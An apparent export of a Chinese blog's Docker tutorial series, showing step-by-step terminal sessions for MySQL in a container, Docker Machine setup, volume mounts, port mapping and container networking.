complete999c06ab75f6: Pull completec71d695f9937: Pull completec38f847c1491: Pull complete5e0cb05a8fc3: Pull completec89e3e373fca: Pull completefa39a2c9922d: Pull completeb293d9c897c4: Pull complete3dc061869740: Pull completeDigest: sha256:43ed4f8c9d1695e97a39cdfe9475af9096e3723cfb79d820d8da00d61a277a85Status: Downloaded newer image for docker.io/mysql:latest</code></pre><p>拉取成功，现在开始创建<code>Mysql</code>容器。</p><pre><code>[root@promote ~]# docker run -itd --name=mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=000000 docker.io/mysql30d60b852cf57c5f4e7df36846b10149387bb2b736cecb11f12a2d64a3bdbf43</code></pre><p>进入容器。</p><pre><code>[root@promote ~]# docker exec -it mysql /bin/bashroot@30d60b852cf5:/#</code></pre><p>连接数据库。</p><pre><code>root@30d60b852cf5:/# mysql -uroot -p000000mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 8Server version: 8.0.11 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt;</code></pre><p>连接数据库成功！<br>先学习查看数据库。</p><pre><code>mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.01 sec)</code></pre><p>然后是创建数据库。</p><pre><code>mysql&gt; create database gubeiqing;Query OK, 1 row affected (0.02 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| gubeiqing          || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)</code></pre><p>接着使用我刚刚创建好的<code>gubeiqing</code>数据库。</p><pre><code>mysql&gt; use gubeiqing;Database changed</code></pre><p>进入这个数据库之后，来看一下有哪些表。</p><pre><code>mysql&gt; show tables;Empty set (0.00 sec)</code></pre><p>这个时候的数据表是空的，接着来创建数据表。</p><pre><code>mysql&gt; create table gubeiqing1(name varchar(20) not null , age varchar(20) not null);Query OK, 0 rows affected (0.08 sec)</code></pre><p>建表的通用语句语法是：<code>CREATE TABLE table_name (column_name column_type);</code>.<br>现在来查看一下数据表是什么样的。</p><pre><code>mysql&gt; desc gubeiqing1;+-------+-------------+------+-----+---------+-------+| Field | Type        | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| name  | varchar(20) | NO   |     | NULL    |       || age   | varchar(20) | NO   |     | NULL    |       |+-------+-------------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><p>可以看到现在<code>gubeiqing1</code>这个数据表已经有了两列。但是还没有数据，所以现在向这个数据表里添加数据。</p><pre><code>mysql&gt; insert into gubeiqing1 (name,age) values (&apos;gbq&apos;,21);Query OK, 1 row affected (0.04 sec)</code></pre><p>如果添加的数据是字符型，那么必须使用单引号或者双引号。<br>现在查询一下这个表里所有的内容。</p><p>可以看到数据已经被我们添加进去了。</p><pre><code>mysql&gt; select * from gubeiqing1;+------+-----+| name | age |+------+-----+| gbq  | 21  |+------+-----+1 row in set (0.00 sec)</code></pre><p>简单的查询语句语法是:<code>SELECT column_name,column_nameFROM table_name</code>。</p><p>再来插入几条（插入时可以不指定列名，但是自己要知道插入数据的顺序）。</p><pre><code>mysql&gt; insert into gubeiqing1 values (&apos;zhangsan&apos;,20);Query OK, 1 row affected (0.05 sec)mysql&gt; insert into gubeiqing1 values (&apos;lisi&apos;,19);Query OK, 1 row affected (0.03 sec)</code></pre><p>查看一下。</p><pre><code>mysql&gt; select * from gubeiqing1;+----------+-----+| name     | age |+----------+-----+| gbq      | 21  || zhangsan | 20  || lisi     | 19  |+----------+-----+3 rows in set (0.00 sec)</code></pre><p>然后学习改数据。<br>现在我将<code>lisi</code>的<code>age</code>字段，由<code>19</code>改为<code>22</code>。</p><pre><code>mysql&gt; update gubeiqing1 set age=22 where name=&apos;lisi&apos;;Query OK, 1 row affected (0.04 sec)Rows matched: 1  Changed: 1  Warnings: 0</code></pre><p>改数据的基本简单语法是：<code>UPDATE table_name SET column_name1=values1，column_name2=values2 [WHERE 条件表达式]</code>。</p><p>再查看一下数据表。</p><pre><code>mysql&gt; select * from gubeiqing1;+----------+-----+| name     | age |+----------+-----+| gbq      | 21  || zhangsan | 20  || lisi     | 22  |+----------+-----+3 rows in set (0.00 sec)</code></pre><p>可以看到<code>lisi</code>的<code>age</code>字段已经被改了。<br>数据库基本的增删改查，已经看了三个，接着来看删。<br>将<code>zhangsan</code>这条数据从数据表中删除。</p><pre><code>mysql&gt; delete from gubeiqing1 where name=&apos;zhangsan&apos;;Query OK, 1 row affected (0.39 sec)mysql&gt; select * from gubeiqing1;+------+-----+| name | age |+------+-----+| gbq  | 21  || lisi | 22  |+------+-----+2 rows in set (0.00 sec)</code></pre><p>再来删除这个表，最后删除库。</p><pre><code>mysql&gt; drop table gubeiqing1;Query OK, 0 rows affected (0.13 sec)mysql&gt; show tables;Empty set (0.00 sec)mysql&gt; drop database gubeiqing;Query OK, 0 rows affected (0.09 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)</code></pre>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享12</title>
      <link href="/2018/07/16/docker12/"/>
      <url>/2018/07/16/docker12/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker多主机管理"><a href="#Docker多主机管理" class="headerlink" title="Docker多主机管理"></a>Docker多主机管理</h1><p>之前在一台Centos7上安装了Docker，如果是在多台主机上都安装Docker，用手动安装的方法不光效率低下，而且有可能出错，所以可以使用<code>Docker Machine</code>进行多台主机的Docker安装和管理。<br>具体安装过程可以参照官方文档<a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="noopener">https://docs.docker.com/machine/install-machine/</a>.<br>首先准备两台Centos7的虚拟机（一台IP为<code>192.168.41.133</code>，安装<code>Docker Machine</code>，另一台IP为<code>192.168.41.135</code>），在其中一台机器上安装Docker，安装过程可以参照分享01.<br>然后下载<code>Docker Machine</code>二进制文件并将其解压缩到PATH。</p><pre><code>[root@promote ~]# base=https://github.com/docker/machine/releases/download/v0.14.0 &amp;&amp;&gt;   curl -L $base/docker-machine-$(uname -s)-$(uname -m) &gt;/tmp/docker-machine &amp;&amp;&gt;   sudo install /tmp/docker-machine /usr/local/bin/docker-machine% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                Dload  Upload   Total   Spent    Left  Speed100   617    0   617    0     0    583      0 --:--:--  0:00:01 --:--:--   584100 26.7M  100 26.7M    0     0  1730k      0  0:00:15  0:00:15 --:--:-- 3488k</code></pre><p>接着通过显示机器版本来检查安装：</p><pre><code>[root@promote ~]# docker-machine versiondocker-machine version 0.14.0, build 89b8332</code></pre><p>为了更好的体验接着安装bash完成脚本，将脚本保存到<code>/etc/bash_completion.d</code>或 <code>/usr/local/etc/bash_completion.d</code>。</p><pre><code>[root@promote ~]# cd /etc/bash_completion.d[root@promote bash_completion.d]# base=https://raw.githubusercontent.com/docker/machine/v0.14.0[root@promote bash_completion.d]# for i in docker-machine-prompt.bash docker-machine-wrapper.bash docker-machine.                                                                         bash&gt; do&gt;   sudo wget &quot;$base/contrib/completion/bash/${i}&quot; -P /etc/bash_completion.d&gt; done--2018-07-11 01:47:47--  https://raw.githubusercontent.com/docker/machine/v0.14.0/contrib/completion/bash/docker-                                                                         machine-prompt.bashResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 1469 (1.4K) [text/plain]Saving to: ‘/etc/bash_completion.d/docker-machine-prompt.bash’100%[=======================================================================&gt;] 1,469       --.-K/s   in 0s2018-07-11 01:47:48 (192 MB/s) - ‘/etc/bash_completion.d/docker-machine-prompt.bash’ saved [1469/1469]--2018-07-11 01:47:48--  https://raw.githubusercontent.com/docker/machine/v0.14.0/contrib/completion/bash/docker-                                                                         machine-wrapper.bashResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 1525 (1.5K) [text/plain]Saving to: ‘/etc/bash_completion.d/docker-machine-wrapper.bash’100%[=======================================================================&gt;] 1,525       --.-K/s   in 0s2018-07-11 01:47:50 (160 MB/s) - ‘/etc/bash_completion.d/docker-machine-wrapper.bash’ saved [1525/1525]--2018-07-11 01:47:50--  https://raw.githubusercontent.com/docker/machine/v0.14.0/contrib/completion/bash/docker-                                                                         machine.bashResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.40.133Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.40.133|:443... connected.HTTP request sent, awaiting response... 200 OKLength: 12205 (12K) [text/plain]Saving to: ‘/etc/bash_completion.d/docker-machine.bash’100%[=======================================================================&gt;] 12,205      --.-K/s   in 0.02s2018-07-11 01:47:51 (489 KB/s) - ‘/etc/bash_completion.d/docker-machine.bash’ saved [12205/12205]</code></pre><p>这样就下载好了脚本。<br>接着申明环境变量。</p><pre><code>[root@promote bash_completion.d]# source /etc/bash_completion.d/docker-machine-prompt.bash </code></pre><p>可以先使用<code>docker-machine ls</code>查看一下当前的<code>machine</code>.</p><pre><code>[root@promote ~]# docker-machine lsNAME   ACTIVE   DRIVER   STATE   URL   SWARM   DOCKER   ERRORS</code></pre><p>因为还没有安装Docker所以使用这条命令什么都没有。<br>接着创建第一台机器，就是另外一台Centos虚拟机（IP：192.168.41.155）.<br>1.首先需要让这两台Centos可以SSH免密登陆。</p><pre><code>[root@promote ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Created directory &apos;/root/.ssh&apos;.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:T6qcnNvYwepsMhGfdvG/Gk+BtzVe2eCLiF0aMAI6wqc root@promote.cache-dns.localThe key&apos;s randomart image is:+---[RSA 2048]----+|    .            ||.  . .           ||..o.  . o     .  || .o..  ..o . . .o|| E   o .So+ + +.o||    . +..*.* * + ||     o .= *.+ o  ||    o+.O . +.    ||     =%.o ..o.   |+----[SHA256]-----+[root@promote ~]# ssh-copy-id 192.168.41.135/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;The authenticity of host &apos;192.168.41.135 (192.168.41.135)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:JqAC8jcLCLobvRy0wzY9VGBNuZU3EydpO8n2fEtQ178.ECDSA key fingerprint is MD5:5d:26:a1:60:c3:eb:02:e9:97:7a:bb:7a:49:8a:14:0b.Are you sure you want to continue connecting (yes/no)? yes/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@192.168.41.135&apos;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &apos;192.168.41.135&apos;&quot;and check to make sure that only the key(s) you wanted were added.</code></pre><p>2.创建第一个机器<br>使用<code>docker-machine create</code>命令，因为是Linux，所以<code>driver</code>就用<code>generic</code>,目标地址选项用<code>--generic-ip-address</code>。</p><pre><code>[root@promote ~]# docker-machine create --driver generic --generic-ip-address=192.168.41.135 machine1Creating CA: /root/.docker/machine/certs/ca.pemCreating client certificate: /root/.docker/machine/certs/cert.pemRunning pre-create checks...Creating machine...(machine1) No SSH key specified. Assuming an existing key at the default location.Waiting for machine to be running, this may take a few minutes...Detecting operating system of created instance...Waiting for SSH to be available...Detecting the provisioner...Provisioning with centos...Copying certs to the local machine directory...Copying certs to the remote machine...Setting Docker configuration on the remote daemon...Checking connection to Docker...Docker is up and running!To see how to connect your Docker Client to the Docker Engine running on this virtual machine, run: docker-machine env machine1</code></pre><p>现在到<code>192.168.41.135</code>上去验证。</p><pre><code>[root@promote ~]# docker versionClient:Version:      18.05.0-ceAPI version:  1.37Go version:   go1.9.5Git commit:   f150324Built:        Wed May  9 22:14:54 2018OS/Arch:      linux/amd64Experimental: falseOrchestrator: swarmServer:Engine:Version:      18.05.0-ceAPI version:  1.37 (minimum version 1.12)Go version:   go1.9.5Git commit:   f150324Built:        Wed May  9 22:18:36 2018OS/Arch:      linux/amd64Experimental: false</code></pre><p>也可以在<code>192.168.41.133</code>上验证。</p><pre><code>[root@promote ~]# docker-machine lsNAME       ACTIVE   DRIVER    STATE     URL                         SWARM   DOCKER        ERRORSmachine1   -        generic   Running   tcp://192.168.41.135:2376           v18.05.0-ce</code></pre><p>发现安装完成。<br>接着我通过<code>192.168.41.133</code>这台主机来使用<code>192.168.41.135</code>主机上的Docker,首先查看访问machine所需要的环境变量。</p><pre><code>[root@promote ~]# docker-machine env machine1export DOCKER_TLS_VERIFY=&quot;1&quot;export DOCKER_HOST=&quot;tcp://192.168.41.135:2376&quot;export DOCKER_CERT_PATH=&quot;/root/.docker/machine/machines/machine1&quot;export DOCKER_MACHINE_NAME=&quot;machine1&quot;# Run this command to configure your shell:# eval $(docker-machine env machine1)</code></pre><p>可以看到倒数第二行：运行此命令来配置你的shell<br>也就是指运行<code>eval $(docker-machine env machine1)</code>命令配置上面的环境变量进入<code>machine1</code>.<br>运行之后发现并无变化，是因为一开始我们没有配置<code>shell</code>提示.<br>接着启用<code>docker-machine</code>shell提示，添加 <code>$(__docker_machine_ps1)</code>到您的<code>PS1</code>设置中<code>~/.bashrc</code>。</p><pre><code>[root@promote ~]# PS1=&apos;[\u@\h \W$(__docker_machine_ps1)]\$ &apos;[root@promote ~ [machine1]]#</code></pre><p>这时发现shell变了，在当前状态下的所有docker操作都是运行在<code>machine1</code>上的，即<code>192.168.41.135</code>主机上。<br>如果要切回回来的环境使用<code>unset</code>命令，取消环境变量即可：</p><pre><code>[root@promote ~ [machine1]]# unset export DOCKER_TLS_VERIFY[root@promote ~ [machine1]]# unset DOCKER_HOST[root@promote ~ [machine1]]# unset DOCKER_CERT_PATH[root@promote ~ [machine1]]# unset DOCKER_MACHINE_NAME[root@promote ~]#</code></pre><p>发现变回来了。<br><code>docker-machine</code>的其他用法可以使用<code>docker-machine --help</code>命令来查看。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享11</title>
      <link href="/2018/07/16/docker11/"/>
      <url>/2018/07/16/docker11/</url>
      
        <content type="html"><![CDATA[<h1 id="容器的数据存储"><a href="#容器的数据存储" class="headerlink" title="容器的数据存储"></a>容器的数据存储</h1><p>容器在删除之后，里面所有的数据都会丢失，如果其他程序需要用到某一部分的数据那就没办法了。<br>所以可以将容器内的数据存储到容器之外，比如存储到宿主机内。（Docker提供了好几种方法）<br>将容器内的数据存放到容器外可以通过将宿主机内的某个目录挂载给容器作为某一部分的存储空间使用。<br>先在<code>/root</code>目录下新建一个名为data的目录以供容器使用。</p><pre><code>[root@promote ~]# mkdir data[root@promote ~]# lsdata</code></pre><p>接着创建容器并将<code>data</code>目录挂载给容器作为存储。<br>使用<code>-v 宿主机目录:容器目录</code>.<br>这里以<code>http</code>为例，因为<code>http</code>存放静态网页的默认位置在<code>/usr/local/apache2/htdocs</code>，所以将<code>data</code>目录用作此目录的存储空间，专门用来存放网页。</p><pre><code>[root@promote ~]# docker run -d --name http -p 80:80 -v ~/data:/usr/local/apache2/htdocs docker.io/httpdc6b71842d961663d380cecae5373c10236109e860bad18207195e9636ddb121f</code></pre><p>这样就挂载好了。<br>现在在<code>data</code>目录下新建一个<code>index.html</code>静态网页试试。</p><pre><code>[root@promote ~]# cd data/[root@promote data]# cat index.html&lt;html&gt;        &lt;body&gt;This is a test&lt;/body&gt;&lt;/html&gt;</code></pre><p>接着访问宿主机的80端口查看。</p><pre><code>[root@promote ~]# curl 127.0.0.1:80&lt;html&gt;        &lt;body&gt;This is a test&lt;/body&gt;&lt;/html&gt;</code></pre><p>说明<code>data</code>目录挂载到容器成功。<br>而<code>http</code>容器里原来的<code>index.html</code>被覆盖了。</p><p>如果访问宿主机80端口时被拒绝访问：</p><pre><code>[root@promote ~]# curl 127.0.0.1:80&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&apos;t have permission to access /on this server.&lt;br /&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>可以尝试关闭<code>selinux</code>再访问，<code>setenforce 0</code>是临时关闭<code>selinux</code>。</p><pre><code>[root@promote ~]# setenforce 0[root@promote ~]# curl 127.0.0.1:80&lt;html&gt;        &lt;body&gt;This is a test&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享10</title>
      <link href="/2018/07/16/docker10/"/>
      <url>/2018/07/16/docker10/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器向外提供服务"><a href="#Docker容器向外提供服务" class="headerlink" title="Docker容器向外提供服务"></a>Docker容器向外提供服务</h1><p>用分享04中的Nginx服务来试一下。<br>不过这次我直接用<code>Nginx</code>镜像创建容器，先下载<code>Nginx</code>镜像。</p><pre><code>[root@promote ~]# docker search nginxINDEX       NAME                                                             DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDdocker.io   docker.io/nginx                                                  Official build of Nginx.                        8981      [OK]docker.io   docker.io/jwilder/nginx-proxy                                    Automated Nginx reverse proxy for docker c...   1357                 [OK]docker.io   docker.io/richarvey/nginx-php-fpm                                Container running Nginx + PHP-FPM capable ...   586                  [OK]docker.io   docker.io/jrcs/letsencrypt-nginx-proxy-companion                 LetsEncrypt container to use with nginx as...   387                  [OK]docker.io   docker.io/kong                                                   Open-source Microservice &amp; API Management ...   203       [OK]docker.io   docker.io/webdevops/php-nginx                                    Nginx with PHP-FPM                              106                  [OK]docker.io   docker.io/kitematic/hello-world-nginx                            A light-weight nginx container that demons...   102docker.io   docker.io/zabbix/zabbix-web-nginx-mysql                          Zabbix frontend based on Nginx web-server ...   58                   [OK]docker.io   docker.io/bitnami/nginx                                          Bitnami nginx Docker Image                      54                   [OK]docker.io   docker.io/1and1internet/ubuntu-16-nginx-php-phpmyadmin-mysql-5   ubuntu-16-nginx-php-phpmyadmin-mysql-5          36                   [OK]docker.io   docker.io/linuxserver/nginx                                      An Nginx container, brought to you by Linu...   36docker.io   docker.io/tobi312/rpi-nginx                                      NGINX on Raspberry Pi / armhf                   20                   [OK]docker.io   docker.io/nginxdemos/nginx-ingress                               NGINX Ingress Controller for Kubernetes . ...   11docker.io   docker.io/blacklabelops/nginx                                    Dockerized Nginx Reverse Proxy Server.          9                    [OK]docker.io   docker.io/wodby/drupal-nginx                                     Nginx for Drupal container image                9                    [OK]docker.io   docker.io/webdevops/nginx                                        Nginx container                                 8                    [OK]docker.io   docker.io/centos/nginx-18-centos7                                Platform for running nginx 1.8 or building...   6docker.io   docker.io/1science/nginx                                         Nginx Docker images that include Consul Te...   4                    [OK]docker.io   docker.io/centos/nginx-112-centos7                               Platform for running nginx 1.12 or buildin...   3docker.io   docker.io/behance/docker-nginx                                   Provides base OS, patches and stable nginx...   2                    [OK]docker.io   docker.io/pebbletech/nginx-proxy                                 nginx-proxy sets up a container running ng...   2                    [OK]docker.io   docker.io/toccoag/openshift-nginx                                Nginx reverse proxy for Nice running on sa...   1                    [OK]docker.io   docker.io/travix/nginx                                           NGinx reverse proxy                             1                    [OK]docker.io   docker.io/ansibleplaybookbundle/nginx-apb                        An APB to deploy NGINX                          0                    [OK]docker.io   docker.io/mailu/nginx                                            Mailu nginx frontend                            0                    [OK]</code></pre><p>还是优先使用官方镜像，将镜像拉取到本地。</p><pre><code>[root@promote ~]# docker pull docker.io/nginxUsing default tag: latestTrying to pull repository docker.io/library/nginx ...latest: Pulling from docker.io/library/nginx683abbb4ea60: Pull completea470862432e2: Pull complete977375e58a31: Pull completeDigest: sha256:a65beb8c90a08b22a9ff6a219c2f363e16c477b6d610da28fe9cba37c2c3a2acStatus: Downloaded newer image for docker.io/nginx:latest</code></pre><p>查看一下本地镜像，看看是否下载成功。</p><pre><code>[root@promote ~]# docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEdocker.io/nginx     latest              3c5a05123222        3 days ago          109 MB</code></pre><p>接着用刚下载好的镜像创建容器。</p><pre><code>[root@promote ~]# docker run -d --name nginx -p 80:80 docker.io/nginx09823eb382b49c72cde153bafa23170212d9ea0da5754d069c68c5e2d29b6a64</code></pre><p>使用<code>-p</code>选项将本地端口映射到容器端口，这里是将Centos的80端口映射到Nginx容器的80端口。<br>可以通过访问Centos的80端口查看Nginx是否安装成功。<br><img alt data-src="https://image.3001.net/images/20181123/15429708153597.jpg" class="lozad"><br>可以看到Docker容器就是通过端口映射向外提供服务的。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享09</title>
      <link href="/2018/07/16/docker09/"/>
      <url>/2018/07/16/docker09/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器之间的相互通信"><a href="#Docker容器之间的相互通信" class="headerlink" title="Docker容器之间的相互通信"></a>Docker容器之间的相互通信</h1><p>先新建两个不同的网段，就用分享08里的两个网段作为新建的网段。</p><pre><code>[root@promote ~]# docker network lsNETWORK ID          NAME                DRIVER              SCOPEb6a32ec430e9        bridge              bridge              local9ab80c94885b        host                host                local0470e5b1d2ad        new2_net            bridge              local236f3139821f        new_net             bridge              localc42335728d98        none                null                local</code></pre><p>接着查看一下这两个网段的具体信息。<br>先看一下<code>new_net</code>网段，网段是<code>172.18.0.0/24</code>。</p><pre><code>[root@promote ~]# docker network inspect new_net[    {        &quot;Name&quot;: &quot;new_net&quot;,        &quot;Id&quot;: &quot;236f3139821f765d4d5572e81065645796bdb32675bdba41da706ca612625ae8&quot;,        &quot;Created&quot;: &quot;2018-07-10T02:21:53.602649029-04:00&quot;,        &quot;Scope&quot;: &quot;local&quot;,        &quot;Driver&quot;: &quot;bridge&quot;,        &quot;EnableIPv6&quot;: false,        &quot;IPAM&quot;: {            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: {},            &quot;Config&quot;: [                {                    &quot;Subnet&quot;: &quot;172.18.0.0/16&quot;,                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;                }            ]        },        &quot;Internal&quot;: false,        &quot;Attachable&quot;: false,        &quot;Containers&quot;: {},        &quot;Options&quot;: {},        &quot;Labels&quot;: {}    }]</code></pre><p>再查看一下<code>new2_net</code>网段,网段是<code>192.168.1.0/24</code>。</p><pre><code>[root@promote ~]# docker network inspect new2_net[    {        &quot;Name&quot;: &quot;new2_net&quot;,        &quot;Id&quot;: &quot;0470e5b1d2ad2fca704d8788f652b76a777f05df37e3894dd8351e9989c5f3d9&quot;,        &quot;Created&quot;: &quot;2018-07-10T02:24:01.201554097-04:00&quot;,        &quot;Scope&quot;: &quot;local&quot;,        &quot;Driver&quot;: &quot;bridge&quot;,        &quot;EnableIPv6&quot;: false,        &quot;IPAM&quot;: {            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: {},            &quot;Config&quot;: [                {                    &quot;Subnet&quot;: &quot;192.168.1.0/24&quot;,                    &quot;Gateway&quot;: &quot;192.168.1.1&quot;                }            ]        },        &quot;Internal&quot;: false,        &quot;Attachable&quot;: false,        &quot;Containers&quot;: {},        &quot;Options&quot;: {},        &quot;Labels&quot;: {}    }]</code></pre><p>接着创建两个容器，分别连接到<code>new_net</code>和<code>new2_net</code>两个不同的网段（使用<code>Ctrl+P+Q</code>让容器在后台运行）。</p><pre><code>[root@promote ~]# docker run -it --name busybox --network new_net docker.io/busybox/ # [root@promote ~]# docker run -it --name busybox2 --network new2_net docker.io/busybox/ # </code></pre><p>创建完成之后，先进<code>busybox</code>查看一下网络设备，再<code>ping</code>一下<code>busybox2</code>看看容器的连通性。</p><pre><code>[root@promote ~]# docker attach busybox/ # ifconfigeth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02        inet addr:172.18.0.2  Bcast:0.0.0.0  Mask:255.255.0.0        inet6 addr: fe80::42:acff:fe12:2/64 Scope:Link        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1        RX packets:22 errors:0 dropped:0 overruns:0 frame:0        TX packets:36 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:0        RX bytes:1879 (1.8 KiB)  TX bytes:3108 (3.0 KiB)lo        Link encap:Local Loopback        inet addr:127.0.0.1  Mask:255.0.0.0        inet6 addr: ::1/128 Scope:Host        UP LOOPBACK RUNNING  MTU:65536  Metric:1        RX packets:9 errors:0 dropped:0 overruns:0 frame:0        TX packets:9 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:1000        RX bytes:803 (803.0 B)  TX bytes:803 (803.0 B)          [root@promote ~]# docker attach busybox/ # ping 192.168.1.2PING 192.168.1.2 (192.168.1.2): 56 data bytes^C--- 192.168.1.2 ping statistics ---19 packets transmitted, 0 packets received, 100% packet loss</code></pre><p>发现<code>ping</code>不通，为了让它可以互相<code>ping</code>通，可以将<code>busybox2</code>连接到<code>busybox</code>所在的网络里。</p><pre><code>[root@promote ~]# docker network connect new2_net busybox[root@promote ~]#</code></pre><p>再进入<code>busybox</code>ping一下<code>busybox2</code>试试。</p><pre><code>[root@promote ~]# docker attach busybox/ # ping 192.168.1.2PING 192.168.1.2 (192.168.1.2): 56 data bytes64 bytes from 192.168.1.2: seq=0 ttl=64 time=0.094 ms64 bytes from 192.168.1.2: seq=1 ttl=64 time=0.149 ms64 bytes from 192.168.1.2: seq=2 ttl=64 time=0.139 ms^C--- 192.168.1.2 ping statistics ---3 packets transmitted, 3 packets received, 0% packet lossround-trip min/avg/max = 0.094/0.127/0.149 ms</code></pre><p>发现可以<code>ping</code>通了。<br>再看一下<code>busybox2</code>的网络设备。</p><pre><code>/ # ifconfigeth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02        inet addr:172.18.0.2  Bcast:0.0.0.0  Mask:255.255.0.0        inet6 addr: fe80::42:acff:fe12:2/64 Scope:Link        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1        RX packets:22 errors:0 dropped:0 overruns:0 frame:0        TX packets:36 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:0        RX bytes:1879 (1.8 KiB)  TX bytes:3108 (3.0 KiB)eth1      Link encap:Ethernet  HWaddr 02:42:C0:A8:01:03        inet addr:192.168.1.3  Bcast:0.0.0.0  Mask:255.255.255.0        inet6 addr: fe80::42:c0ff:fea8:103/64 Scope:Link        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1        RX packets:13 errors:0 dropped:0 overruns:0 frame:0        TX packets:13 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:0        RX bytes:1026 (1.0 KiB)  TX bytes:1026 (1.0 KiB)lo        Link encap:Local Loopback        inet addr:127.0.0.1  Mask:255.0.0.0        inet6 addr: ::1/128 Scope:Host        UP LOOPBACK RUNNING  MTU:65536  Metric:1        RX packets:9 errors:0 dropped:0 overruns:0 frame:0        TX packets:9 errors:0 dropped:0 overruns:0 carrier:0        collisions:0 txqueuelen:1000        RX bytes:803 (803.0 B)  TX bytes:803 (803.0 B)</code></pre><p>发现<code>busybox2</code>容器多出一个网络设备<code>eth1</code>，就相当于为了可以让两个容器互通，在<code>busybox2</code>中添加了一块虚拟网卡，然后分配给它一个IP地址使得他们可以互通。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享08</title>
      <link href="/2018/07/16/docker08/"/>
      <url>/2018/07/16/docker08/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器网络"><a href="#Docker容器网络" class="headerlink" title="Docker容器网络"></a>Docker容器网络</h1><p>Docker除了默认创建的三种网络外，还可以自定义网络。<br>首先创建一个<code>bridge</code>类型的网络，使用<code>docker network create</code>命令。</p><pre><code>[root@promote ~]# docker network create --driver bridge new_net8f0d50950bb7b86f01f5a62d6a322ede46fa893c515acf10d0e335fa28ccf234[root@promote ~]# docker network lsNETWORK ID          NAME                DRIVER              SCOPEb6a32ec430e9        bridge              bridge              local9ab80c94885b        host                host                local8f0d50950bb7        new_net             bridge              localc42335728d98        none                null                local</code></pre><p>查看一下当前的网络变化。</p><pre><code>[root@promote ~]# brctl showbridge name     bridge id               STP enabled     interfacesbr-8f0d50950bb7         8000.024233fc2bd6       nodocker0         8000.0242f338d5bb       